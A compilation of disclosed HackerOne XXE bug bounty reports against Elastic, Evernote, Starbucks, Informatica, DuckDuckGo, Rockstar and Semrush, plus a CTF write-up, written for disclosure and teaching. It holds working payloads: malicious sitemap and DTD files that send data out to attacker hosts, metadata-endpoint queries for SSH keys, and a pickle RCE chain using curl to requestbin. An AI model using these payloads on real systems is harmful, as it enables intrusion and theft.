Enterprise Search has a Web Crawler that crawls websites and ingests data to make it searchable. The crawler will look for `robots.txt` files and in that file it will look for the `sitemap` directive. When the sitemap is present, the crawler will parse it and crawl each pages that's listed there.

The code used to parse the site map is vulnerable to XXE. At the time of reporting I'm limited to exfiltrating only files that contain one line and admittedly this is very limiting, but I'm going to keep looking for ways to bypass this limitation. Once bypassed this has the potential to leak very sensitive data and credentials.

## Steps to reproduce

### Attacker Server

This is my attacker server, it's a ruby application that requires `sinatra` (`gem install sinatra`)

```ruby
require 'sinatra'

set :bind, '0.0.0.0'

get '/robots.txt' do

  'User-agent: *
Disallow:

sitemap: /sitemap.xml
'
end

get '/sitemap.xml' do
  content_type 'application/xml'

  '<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlset [
<!ENTITY % dtd SYSTEM "http://YOURDOMAIN.COM/exfil.dtd">
%dtd;
%param1;
%exfil;
]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
<url>
    <loc>&test;</loc>
    <lastmod>2019-06-19</lastmod>
    <changefreq>daily</changefreq>
</url>
</urlset>'
end

get '/exfil.dtd' do
  content_type 'application/xml-dtd'

  '<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % data SYSTEM "file:///etc/hostname">
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM \'http://YOURDOMAIN.COM/exfil?%data;\'>">'
end
```

Save that to a file and run it with `ruby server.rb`.


### Enterprise Search

1. Log in to Enterprise Search
1. Click `Launch App Search`
1. Click `Create an Engine`, give it any name and click `Create Engine`
1. Click `Use the Web Crawler`
1. Enter the domain hosting the XXE payload as the `Domain URL`
1. Click `Start a Crawl` and observe your server logs, you should see the hostname of the targetted machine

Running this on an Elastic Cloud instance I got this in my log.

```text
20.55.27.97 - - [08/Apr/2021:04:16:02 UTC] "GET /exfil?d403d12993e0 HTTP/1.1" 404 459
```

Where `d403d12993e0` is the host name of the machine where my instance is running on. I could also reproduce using the on-premise version.

## Impact

At the moment I can read a limited number of files. If I can get around the one line limit I'll be able to read credentials and potentially AWS metadata.

---

### [Non-production Open Database In Combination With XXE Leads To SSRF](https://hackerone.com/reports/742808)

- **Report ID:** `742808`
- **Severity:** Critical
- **Weakness:** XML External Entities (XXE)
- **Program:** Evernote
- **Reporter:** @kaulse
- **Bounty:** - usd
- **Disclosed:** 2020-10-27T15:20:40.726Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
The Apache Hive database hosted on the IP ██████████ and open on port 10000 is open and vulnerable to XXE.
By "open", I mean that the database can be accessed by anyone.

## Steps To Reproduce:
Chose any database client that supports Apache Hive and also uses a specific client version. "Specific client version" because you will otherwise get an error which looks like this:
```
13:22:26.077 [main] ERROR org.apache.hive.jdbc.HiveConnection - Error opening session
org.apache.hive.org.apache.thrift.TApplicationException: Required field 'client_protocol' is unset! Struct:TOpenSessionReq(client_protocol:null, configuration:{set:hiveconf:hive.server2.thrift.resultset.default.fetch.size=1000, use:database=default})
```
  1. Chose a database client and connect to mentioned IP and port
  2. Execute the following SQL payload:

```SQL
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/project-id"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```
The query above will return the associated project id which is "en-development".

## Supporting Material/References:
I will list some interesting information that I queried below.

**Query**
```SQL
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```
**Response**
```
████
█████
██████████
█████████
██████
██████████
██████
████████
████
████
████████
███████
█████████
███████
██████
█████
███
███
████
████████
██████
█████████
███████
██████████
█████████
████
█████████
████
██████████
█████
██████████
█████
████████
██████████
██████
██████████
█████
█████
██████
██████████
█████
███
████
```

## Impact

Access to the GCP project via the Google Cloud metadata endpoint which leads to access to at least the Google Cloud storage buckets and Google Cloud BigTable/BigQuery.

**Summary (researcher):**

Due to a misconfigured database, it was possible to access Evernote's Google Cloud account which had access permissions to the Google Cloud products BigQuery, BigTable and Google Cloud Storage. Hence, the severity is critical.
The report is out of scope for the BBP program as it's on Evernote's developer environment instead of the production one.

---

### [Singapore - XXE at https://www.starbucks.com.sg/RestApi/soap11](https://hackerone.com/reports/762251)

- **Report ID:** `762251`
- **Severity:** High
- **Weakness:** XML External Entities (XXE)
- **Program:** Starbucks
- **Reporter:** @rugb
- **Bounty:** - usd
- **Disclosed:** 2020-07-22T16:04:44.244Z
- **CVE(s):** -

**Summary (team):**

rugb discovered the endpoint at https://www.starbucks.com.sg/RestApi/* was found vulnerable to XML eXternal Entity (XXE) processing. This permitted arbitrary reading of files on the remote server. This asset is not rated as critical as it does not contain sensitive data.

@rugb — thank you for reporting this vulnerability and for confirming the resolution.

---

### [XXE through injection of a payload in the XMP metadata of a JPEG file](https://hackerone.com/reports/836877)

- **Report ID:** `836877`
- **Severity:** Critical
- **Weakness:** XML External Entities (XXE)
- **Program:** Informatica
- **Reporter:** @moebius
- **Bounty:** - usd
- **Disclosed:** 2020-04-21T09:29:34.893Z
- **CVE(s):** -

**Vulnerability Information:**

Users are able to change their avatar picture. The avatar picture upload functionality is prone to a XXE attack when parsing the image file. Specifically, the XXE attack is executed through the injection of a payload in the "XMP metadata" of the uploaded JPEG file.

Proof of concept (note the "Burp Collaborator Payload pointing to an External DTD"):
```
POST /edit-profile-avatar!uploadImage.jspa HTTP/1.1
Host: ███████informatica.com

  [...REDACTED...PLEASE.SEE.SCREENSHOTS.FOR.FULL.PAYLOAD]
```

And I received the following calls (note the User-Agent "Java██████" confirming the vulnerability):

```
Interaction 0 
Type: HTTP 
Client IP: ███████ 
Timestamp: 2020-Apr-02 01:44:27 UTC  
Protocol: HTTP  

RAW HTTP request: 

GET /x.dtd HTTP/1.1 
Cache-Control: no-cache 
Pragma: no-cache 
User-Agent: Java██████ 
Host: N.syuj65rfsb27o1u78jcinsinnet6ky8n.burpcollaborator.net 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive
```

Similar calls were received from another IP address: 146.112.138.73

Furthermore, the affected host should not be allowed to start a new connection to the Internet.

## Impact

This issue can be abused to read arbitrary files and list directory contents from the filesystem of the XML processor application. I didn't try any reading, but JAVA (JSPA is a JAVA Servlet File) is calling my external service, so the vulnerability is confirmed.

**Summary (team):**

Researcher identified an XXE issue via a JPEG file upload. Researcher worked with us to validate the vulnerability, managed to escalate to return the contents of /etc/passwd and confirmed the issue was then fixed. Informatica responded by initially disabling the feature and then further blocking access to the vulnerable endpoint. Our thanks to moebius for the report, and the detailed writeup associated with it. Some technical details have been redacted in the below. 

Should there be any queries, please contact us via security@informatica.com

---

### [XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx](https://hackerone.com/reports/500515)

- **Report ID:** `500515`
- **Severity:** Critical
- **Weakness:** XML External Entities (XXE)
- **Program:** Starbucks
- **Reporter:** @johnstone
- **Bounty:** - usd
- **Disclosed:** 2019-11-13T00:36:25.662Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
Hi,guys,when i was visited the jobs of starbucks websites in China(https://ecjobs.starbucks.com.cn), i found a features of uploaded user's photo.Thought the bypass the security restrictions of upload,i can upload html|xhtml|xml|config files etc.The uploaded html file can realize the danger of stored xss,and the uploaded xml file can be  parsed by the server,Through tested, the server does not prohibit the use of doctypes, entities, and access to external dtd files. 

## Steps To Reproduce:

Upload and XXE vulnerability: 
1. Log in to the user, enter the personal information settings page, click Upload Image 
2. Intercept https access information through Burp suite
3. addd "html;" attributes in the parameter of "allow_file_type_list",or you can delete the params of "allow_file_type_list",then replace the filename's Suffix name ".jpg" to ".html"
4. Get the server's response information,visited the uploaded file URL.
https://ecjobs.starbucks.com.cn/retail/tempfiles/temp_uploaded_641dee35-5a62-478e-90d7-f5558a78c60e.html
5. uploaded a malicious xml file to the server,change the parameter of "_hxpage"，like

>POST /retail/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=tempfiles/temp_uploaded_d4e4c8c5-c4ab-4743-a6fd-c2d779a29734.xml&max_file_size_kb=1024&allow_file_type_list=xml;jpg;jpeg;png;bmp;

or change the "HX_PAGE_NAME" params of xml date by post

>POST /retail/hxpublic_v6/hxxmlservice6.aspx HTTP/1.1
HX_PAGE_NAME=&quot;tempfiles/temp_uploaded_71cc275c-64fc-40fc-a9cc-52cce5a02858.xml&quot;


post the edited request,the starbucks's server will visit the attacker's server to get the DTD file.

## Impact

The vulnerability can  let the attacker upload the evil files in the server which will spoof the user,steal the user's cookie and informations.The XXE  vulnerability disclose some server's informations ,denial of service attack，maybe will cause NTLMv2 hash attacks through XXE(the starbucks'server environment is iis 7.5+asp.net+windows), which could lead to  attackers having full control over the server and the entire inner domain.
By the way,if the report isn't considered eligible.please let me close this report myself.Thank you

**Summary (team):**

johnstone discovered that both ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx & ecjobs.starbucks.com.cn/recruitjob/hxpublic_v6/hxdynamicpage6.aspx page and were vulnerable to an XML External Entities (XXE) attack.
@johnstone — thank you for reporting this vulnerability and your additional efforts to confirm the resolution.

---

### [XXE in DoD website that may lead to RCE](https://hackerone.com/reports/227880)

- **Report ID:** `227880`
- **Severity:** Critical
- **Weakness:** XML External Entities (XXE)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @jin
- **Bounty:** - usd
- **Disclosed:** 2019-10-04T15:22:27.419Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
XXE in https://█████

**Description:**
A malicious user can modify an XML-based request to include XML content that is then parsed locally.

## Impact
An attacker can use an XML external entity vulnerability to send specially crafted unauthorized XML requests, which will be processed by the XML parser. The attacker can use an XML external entity vulnerability for getting unauthorised access to the OS file system.

## PoC

```
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
Host: https://███
Content-type: text/xml
Content-Length: 50

<!DOCTYPE a PUBLIC "-//B/A/EN" "HELLO_XXE"><a></a>
```

---

### [Partial bypass of #483774 with Blind XXE on https://duckduckgo.com](https://hackerone.com/reports/486732)

- **Report ID:** `486732`
- **Severity:** High
- **Weakness:** XML External Entities (XXE)
- **Program:** DuckDuckGo
- **Reporter:** @mik317
- **Bounty:** - usd
- **Disclosed:** 2019-02-25T16:42:25.787Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Hi DuckDuckGo team,
I've contacted previously you because in a second time (on the #483774 report), I've seen that was possible bypass the fix. Anyway, I've not got any response, and because I think that this is a bit dangerous issue, I'm opening another report for the bypass. Hope you'll agree.

**Steps for reproduction:**
1. Attacker creates a public server and hosts a file with the following content:

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://attacker_host/Blind_xxe"> %ext;
]>
<r></r>
```
2. User goes on https://duckduckgo.com/x.js?u=http://attacker_host/xxe.xml
3. The `http://attacker_host/Blind_xxe` resource will be requested by an host {F413045}

I'd like to say that this affects not only `duckduckgo.com`, but also `api.duckduckgo.com`. Anyway, the #483908 report is still in the `triaged` state, so I think that will not be right against you submit another report also for the `api.duckduckgo.com` domain.

## Impact

Blind XXE leads to `dos` and `blind injection`.

---

### [XXE on https://duckduckgo.com](https://hackerone.com/reports/483774)

- **Report ID:** `483774`
- **Severity:** Critical
- **Weakness:** XML External Entities (XXE)
- **Program:** DuckDuckGo
- **Reporter:** @mik317
- **Bounty:** - usd
- **Disclosed:** 2019-01-31T15:44:25.210Z
- **CVE(s):** -

**Summary (team):**

An XML External Entity (XXE) injection vulnerability was discovered in the `x.js` endpoint on https://duckduckgo.com via `u` parameter. This was due to improper sanitation of external XML entities. The results was a leak of certain world readable files on the system.

This issue was patched. Additionally, we intend to retire the endpoint in the very near future.

Big thanks to @mik317 for reporting this issue!

---

### [Flag WriteUp](https://hackerone.com/reports/415202)

- **Report ID:** `415202`
- **Severity:** Critical
- **Weakness:** XML External Entities (XXE)
- **Program:** h1-5411-CTF
- **Reporter:** @caioluders
- **Bounty:** - usd
- **Disclosed:** 2018-10-22T17:06:23.721Z
- **CVE(s):** -

**Vulnerability Information:**

Hello everyone , here is my writeup :

## Intro
First I decoded the QR Code of the [tweet](https://twitter.com/Hacker0x01/status/1045075889120268289) , decoding to `Here you go: 68747470733a2f2f68312d353431312e68316374662e636f6d` . Decoding the hex value we get the challenge URL : https://h1-5411.h1ctf.com

## Path traversal + local file read

On the website I found two important endpoints : /generate.php and /memes.php . At the generate.php I started doing some "manual fuzzing" trying some command injection, like `;)'";|id`, and template injections like `{{7*7}}` but nothing seemed to work. 
Analyzing the requests I see that the `template` parameter value is a filename , so I try a path traversal with `../../../../../../../etc/passwd` and I get rick rolled :'( But changing the parameter `type` to `text` works ! And I got the first vulnerability .

Path Traversal in `template` parameter
```
$ curl 'https://h1-5411.h1ctf.com/api/generate.php' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:64.0) Gecko/20100101 Firefox/64.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: https://h1-5411.h1ctf.com/generate.php' -H 'Content-Type: application/x-www-form-urlencoded;charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=xxx' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data 'template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&type=text&top-text=a&bottom-text=b'
{"meme_path":"..\/data\/memes\/1538028501-288459b55a1a4ed8bd893f971f758c2f5a6e0cae2c513d6ad9d971cd4a401f8b.txt"}
```
/etc/passwd output
```
$ curl 'https://h1-5411.h1ctf.com/data/memes/1538028501-288459b55a1a4ed8bd893f971f758c2f5a6e0cae2c513d6ad9d971cd4a401f8b.txt'
  A

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
u6488:x:6488:6488:,,,:/app:/bin/bash
dyno:x:6488:6488:,,,:/app:/bin/bash

  B
```

First I tried reading some default configurations files like /proc/self/environ and /proc/self/cmdline without any usable information.
Now with file read I can read all the source code of the application. The default /var/www/html/index.php path works fine, that's good news ! Following the path I read generate.php and memes.php, followed by /includes/config.php and /includes/classes.php.
On classes.php we can see that's a class called `ConfigFile` that is not used anywhere and that the code enable external entities on XML with `libxml_disable_entity_loader(false);` showing that the next step is probably a XXE. 
While trying to figure out the next step I remembered that I haven't looked at the /includes/header.php file because I thought that it was useless. Turns out that it has the endpoints import_memes_2.0.php and export_memes_2.0.php on it's comments. 

## Object Injection + XXE + SSRF
Looking at /api/import_memes_2.0.php it's visible that it receives a file that is base64 encoded and unserialize it. After that, it merges with the `$_SESSION['memes']` array. Now I have a clear way to Object Injection into the `ConfigFile` class, but how to exploit it?
Having in mind that we need to get a XXE somewhere, it's clear that we need to call the `parse` function in the class and initialize the class with the `$url` variable being the malicious XXE payload. The `parse` function is only called by `generate` and `__toString` , the latter is a magic function that is called whenever the class is interpreted as a string and that occurs on `memes.php` on the foreach loop.

Now I have a idea how to exploit it.
Create a serialized array, because of the `array_merge()` , with an `ConfigFile` class initialized with a malicious XXE payload.
As it was late of night and I was really tired, I just created all by hand counting the length of the string and all.

The serialized class without the payload looks like this :
```
a:3:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:2:"ab";}}
```
Now I have to insert the XXE payload, note that it must have `toptext` or a `bottomtext` tag to output the result to the page, at first I tried a RCE payload with `expect://`.
```
a:3:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:167:"<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<payload>
    <toptext>&xxe;</toptext>
</payload>";}}
```
But no output was generated, after that I tried to output the stdout to a server with `expect://curl http://requestbin.net/r/w8rpj9w8?a=$(id)` with no success. Turns out that to expect works the module must be loaded on the PHP.
Now the only thing I can think is a SSRF, as I already have local file read. The next payload is a attempt to get the content of http://google.com
```
a:3:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:174:"<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://google.com" >]>
<payload>
    <toptext>&xxe;</topttext>
</payload>";}}
```
But it failed again. As I couldn't think of any other way to complete the challenge, I tried another technique to achieve SSRF with `php://filter/read=convert.base64-encode/resource=http://google.com`.
```
a:3:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:222:"<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://google.com" >]>
<payload>
    <toptext>&xxe;</toptext>
</payload>";}}
```
And now it worked ! The base64 result was printed on the memes.php page, now I have SSRF.
After that I tried the AWS metadata URL http://169.254.169.254/latest/user-data/ , because the server was on AWS to try to get any credentials, but it didn't work.

So it must be a internal IP. To find the IP:PORT I used the first local file read to read /proc/net/tcp 
```
sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 0100007F:0539 00000000:0000 0A 00000000:00000000 00:00000000 00000000  6488        0 2574392220 1 0000000000000000 100 0 0 10 0                
   1: 9E3610AC:A862 5579F868:0016 01 00000000:00000000 02:000A25B2 00000000  6488        0 2574386053 2 0000000000000000 20 4 29 10 -1
```
Decoding the hex `0100007F:0539` we get 127.0.0.1:1337, so this must be the next step.

## Pickle injection RCE
Using the SSRF to get the http://127.0.0.1:1337.
```
Meme Service - Internal Maintenance API - v0.1 (Alpha); API Documentation: Version 0.1 - Endpoints: /status - View maintenance status; /update-status Change maintenance status; Debug: The debug parameter allows debugging;
```
http://127.0.0.1:1337/status?debug=1
```
Maintenance mode: off | Debug: KGlhcHAKU3RhdHVzCnAxCihkcDIKUydtZXNzYWdlJwpwMwpTJ01haW50ZW5hbmNlIG1vZGU6IG9mZicKcDQKc1MnbWFpbnRlbmFuY2UnCnA1CkkwMApzYi4
```
Sending the `?debug=1` to /status it shows a Python's Pickle serialized data encoded in base64.
```
(iapp
Status
p1
(dp2
S'message'
p3
S'Maintenance mode: off'
p4
sS'maintenance'
p5
I00
s
```
http://127.0.0.1:1337/update-status?debug=1
```
Missing status parameter
```
So we have to send a status parameter

http://127.0.0.1:1337/update-status?debug=1&status=hacked
```
Invalid status | Debug: Incorrect paddi
```
I tried to send the base64 he outputs on  the /status and it worked ! So I have to send a base64 encoded pickle object on the status parameter. 

Pickle is notorious vulnerable to RCE, so I tried a simple exploit available at https://gist.github.com/0xBADCA7/f4c700fcbb5fb8785c14.
```
$ python pick.py | base64
Y3Bvc2l4CnN5c3RlbQpwMAooUydpZCcKcDEKdHAyClJwMwouCg==
```
Sending this to `/update-status?debug=1&status=Y3Bvc2l4CnN5c3RlbQpwMAooUydpZCcKcDEKdHAyClJwMwouCg%3D%3D` showed
```
A new status has been loaded. Automatic reloading not implemented yet
```
But no output. Changing the command to `curl http://requestbin.net/r/w8rpj9w8?c=$(id|base64)` sended the output to my server in a get .
```
dWlkPTEwMDAoaGFja2VyKSBnaWQ9MTAwMChoYWNrZXIpIGdyb3Vwcz0xMDAwKGhhY2tlcikK
$ pbpaste | base64 --decode
uid=1000(hacker) gid=1000(hacker) groups=1000(hacker)
```
Trying now a `$(ls|base64)`
```
app.py
app.pyc
flag.txt
requirements.txt
static
status.pi
```
And a `$(cat flag.txt|base64)`
```
Yay! Here is your flag:

flag{cha1n1ng_bugs_f0r_fun_4nd_
```
For some reason the base64 is cutted out, but sending a sed command to get the third line `curl -d $(sed -n 3p flag.txt|base64) http://requestbin.net/r/w8rpj9w8` I get all the flag.
```
flag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}
```

## Impact

The impact of the challenge is to get me a ticket to h1-5411

---

### [LFI and SSRF via XXE in emblem editor](https://hackerone.com/reports/347139)

- **Report ID:** `347139`
- **Severity:** Critical
- **Weakness:** XML External Entities (XXE)
- **Program:** Rockstar Games
- **Reporter:** @alexbirsan
- **Bounty:** 1500 usd
- **Disclosed:** 2018-08-01T15:46:11.439Z
- **CVE(s):** -

**Summary (team):**

This summary is provided by the researcher who submitted this report, @alexbirsan . 

___________________________________________________________________________________________________________________________

About one year after I started messing with the emblem editor, I finally found a full SSRF and LFI. I was able to extract text files from the server and HTTP responses by rendering them on my crew emblem.

For those of you who are not familiar with the emblem editor, the interesting part is a SVG to PNG conversion using user supplied input. The main pieces of my exploit were mostly quirks in the ImageMagick version used by Rockstar:

1. Double forward slash to reference an SMB path:

    ```xml
    <rect fill=“url(//attacker.com/malicious.svg#exploit)”>
    ```
    This allowed me to bypass a regex filter and load arbitrary SVG data into ImageMagick by hosting an external SVG image on my server.

2. Classic XXE:

    ```xml
<!DOCTYPE svg [
<!ENTITY % outside SYSTEM "http://attacker.com/exfil.dtd">
%outside;
]>
<svg>
  <defs>
    <pattern id="exploit">
      <text x="10" y="10">
        &exfil;
      </text>
    </pattern>
  </defs>
</svg>
```
    **exfil.dtd**

    ```xml
<!ENTITY % data SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts">
<!ENTITY exfil "%data;">
```
    This particular version of ImageMagick was vulnerable to a regular XXE attack. By referencing a malicious external DTD in my hosted SVG file, I could extract text files, http responses, or even files from remote shares (again, using `//`).

3. Bonus method - XIncludes

    ```xml
<text x="10" y="10">
    <xi:include href="https://www.google.com/" parse="text"/>
</text>
```
It turns out XIncludes were also supported here. This allowed me to get the same results as the XXE method, but it's a bit more reliable and straight-forward.

The final POC looked like this:
{F293137}

**Summary (researcher):**

About one year after I started messing with the emblem editor, I finally found a full SSRF and LFI. I was able to extract text files from the server and HTTP responses by rendering them on my crew emblem.

For those of you who are not familiar with the emblem editor, the interesting part is a SVG to PNG conversion using user supplied input. The main pieces of my exploit were mostly quirks in the ImageMagick version used by Rockstar:

1. Double forward slash to reference an SMB path:

    ```xml
    <rect fill=“url(//attacker.com/malicious.svg#exploit)”>
    ```
    This allowed me to bypass a regex filter and load arbitrary SVG data into ImageMagick by hosting an external SVG image on my server.

2. Classic XXE:

    ```xml
    <!DOCTYPE svg [
    <!ENTITY % outside SYSTEM "http://attacker.com/exfil.dtd">
    %outside;
    ]>
    <svg>
      <defs>
        <pattern id="exploit">
          <text x="10" y="10">
            &exfil;
          </text>
        </pattern>
      </defs>
    </svg>
    ```
    
    **exfil.dtd**
    ```xml
    <!ENTITY % data SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts">
    <!ENTITY exfil "%data;">
    ```

    This particular version of ImageMagick was vulnerable to a regular XXE attack. By referencing a malicious external DTD in my hosted SVG file, I could extract text files, http responses, or even files from remote shares (again, using `//`).

3. Bonus method - XIncludes
   
    ```xml
    <text x="10" y="10">
        <xi:include href="https://www.google.com/" parse="text"/>
    </text>
    ```
    
    It turns out XIncludes were also supported here. This allowed me to get the same results as the XXE method, but it's a bit more reliable and straight-forward.

The final POC looked like this:
{F293137}

---

### [XXE in Site Audit function exposing file and directory contents](https://hackerone.com/reports/312543)

- **Report ID:** `312543`
- **Severity:** Critical
- **Weakness:** XML External Entities (XXE)
- **Program:** Semrush
- **Reporter:** @ajxchapman
- **Bounty:** - usd
- **Disclosed:** 2018-03-13T14:24:37.574Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 
The Project Site Audit function is vulnerable to XXE when parsing sitemap.xml files.

**Description:** 
The Site Audit function spiders a given website and performs analysis on the discovered pages. In order to improve website spidering the URL of a `sitemap.xml` file can be provided. If provided, the `sitemap.xml` file will be downloaded and processed by a Java XML processor.

The Java xml processor used is vulnerable to XXE attacks. By providing an external document type declaration (DTD) the XML processor can be coerced into processing external entities, for example:

**sitemap.xml**
```xml
<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "http://xxe.webhooks.pw/text.txt" >]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
    <url>
        <loc>&xxe;</loc>
        <lastmod>2006-11-18</lastmod>
        <changefreq>daily</changefreq>
        <priority>0.8</priority>
    </url>
</urlset>
```
Will cause the XML processor to process the external entity at http://xxe.webhooks.pw/text.txt:
```
"███" - - [05/Feb/2018:13:12:26 +0000] "GET /text.txt HTTP/1.1" 302 - "-" "Java/1.8.0_144"
```

This issue can be abused to read arbitrary files and list directory contents from the filesystem of the XML processor application. See the supporting materials below for an example of reading the `/etc/hostname` file and listing the contents of the `/home` directory.

## Browsers Verified In:

* Firefox 58.0.1 (64-bit)
* Google Chrome 63.0.3239.132 (64-bit)

## Steps To Reproduce:

  1. Create a new project with the domain hosting the malicious `sitemap.xml` file, e.g. `semrush.webhooks.pw`
  2. Set up a new "Site Audit"
  3. Within "Site Audit Settings" change "Crawl Source" to "Enter sitemap URL" and add the url of the malicious `sitemap.xml` file. An example `sitemap.xml`, e.g. http://static.webhooks.pw/files/semrush_sitemap.xml.
  4. Start the "Site Audit"
  5. The "Site Audit" background process will then kick off, download the provided sitemap.xml file and process it, triggering the XXE vulnerability.

See the attached screen capture for an example of exploiting this issue. Note, this screen capture is approximately 1 minute long.

## Supporting Material/References:
### File reading
**sitemap.xml**
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlset [
 <!ENTITY % goodies SYSTEM "file:///etc/hostname">
 <!ENTITY % dtd SYSTEM "http://dtd.webhooks.pw/files/combine.dtd">
%dtd;
]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
    <url>
        <loc>http://location.webhooks.pw/resp/&xxe;</loc>
        <lastmod>2006-11-18</lastmod>
        <changefreq>daily</changefreq>
        <priority>0.8</priority>
    </url>
</urlset>
```
**combine.dtd**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY xxe "%goodies;">
```

**Output:**
```
"46.229.173.66" - - [05/Feb/2018:14:26:02 +0000] "GET /resp/███████ HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; SemrushBot-SA/0.97; +http://www.semrush.com/bot.html)"
---

Decoded:
███████
```

### Directory listing
**sitemap.xml**
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlset [
 <!ENTITY % goodies SYSTEM "file:///home/">
 <!ENTITY % dtd SYSTEM "http://dtd.webhooks.pw/files/combine.dtd">
%dtd;
]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
    <url>
        <loc>http://location.webhooks.pw/resp/&xxe;</loc>
        <lastmod>2006-11-18</lastmod>
        <changefreq>daily</changefreq>
        <priority>0.8</priority>
    </url>
</urlset>
```
**combine.dtd**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY xxe "%goodies;">
```

**Output:**
```
"46.229.173.66" - - [05/Feb/2018:14:39:35 +0000] "GET /resp/██████ HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; SemrushBot-SA/0.97; +http://www.semrush.com/bot.html)"
---

Decoded:
██████████
█████
█████
cdh
█████████
██████
███████
█████
█████████
██████████
███
████████
lost found
███████
█████████
█████████
```

## Impact

This issue could be abused to identify and list the contents of sensitive files on the Semrush server which implements the Site Audit functionality.

---

### [Remote Code Execution (RCE) vulnerability in a DoD website](https://hackerone.com/reports/232330)

- **Report ID:** `232330`
- **Severity:** High
- **Weakness:** XML External Entities (XXE)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @p3t3r_r4bb1t
- **Bounty:** - usd
- **Disclosed:** 2017-08-15T15:58:20.173Z
- **CVE(s):** CVE-2017-3548

**Summary (team):**

A remote code execution (RCE) vulnerability was found on a DoD website which could have enabled an attacker to execute remote commands on the web server. Thank you @peuch for notifying us of this vulnerability!

---

